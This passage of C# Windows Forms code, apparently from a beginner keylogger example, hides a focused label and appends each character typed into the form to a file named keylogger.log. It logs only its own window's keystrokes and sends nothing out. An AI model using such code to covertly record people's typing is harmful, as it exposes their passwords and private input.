            InitializeComponent();
            //SET FOCUS ON label1 AND HIDE IT
            label1.Visible = false;
            label1.Select();
        }
        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
        {
            int keyValue = e.KeyChar;
            textBox1.Text = Convert.ToChar(keyValue).ToString();
            if (keyValue == 13) // DETECT "ENTER"
            {
            StreamWriter writelog = File.AppendText(@"C:\keylogger.log");
            writelog.Write(Environment.NewLine);
            writelog.Close();
            }
            else
            {
            StreamWriter writelog = File.AppendText(@"C:\keylogger.log");
            writelog.Write(Convert.ToChar(keyValue).ToString());
            writelog.Close();
            }
        }
